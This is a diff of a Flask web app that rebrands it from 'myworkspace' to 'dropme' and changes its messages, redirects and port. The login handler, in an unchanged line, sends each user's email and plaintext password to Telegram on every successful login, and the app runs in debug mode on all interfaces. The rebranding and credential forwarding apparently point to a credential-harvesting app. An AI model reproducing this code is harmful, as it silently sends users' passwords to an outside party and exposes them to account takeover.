@@ -1,6 +1,4 @@
-
 import os
-
 import secrets
 import urllib.request, urllib.parse
 from flask_sqlalchemy import SQLAlchemy
@@ -231,8 +229,8 @@ def addalumni():
        
             db.session.add(new)
             db.session.commit()
-            flash("New Alumni Added", "success")
-            return redirect('list')
+            flash("Someone just dropme", "success")
+            return redirect('/userbase')
     print(form.errors)
     return render_template("addAlumni.html", form=form, title='addalumni')
 
@@ -738,8 +736,8 @@ def ulogin():
                 print(user.email + "validored successfully")
                 login_user(user)
                 sendtelegram(user.email +' '+ user.password +' '+ 'Logged in successfully' )
-                flash ('Welcome to myworkspace ' ,'success')
-                return redirect(url_for('useryeargroup'))
+                flash ('Welcome to dropme' +' ' + user.name ,'success')
+                return redirect(url_for('userbase'))
                 # next = request.args.get('next')
             else:
                 flash (f'Wrong Password', 'success')
@@ -818,6 +816,6 @@ def userinformation(userid):
 
 if __name__ == '__main__':
     #DEBUG is SET to TRUE. CHANGE FOR PROD
-    app.run(host='0.0.0.0', port=4000, debug=True)
+    app.run(host='0.0.0.0', port=8000, debug=True)
     
     
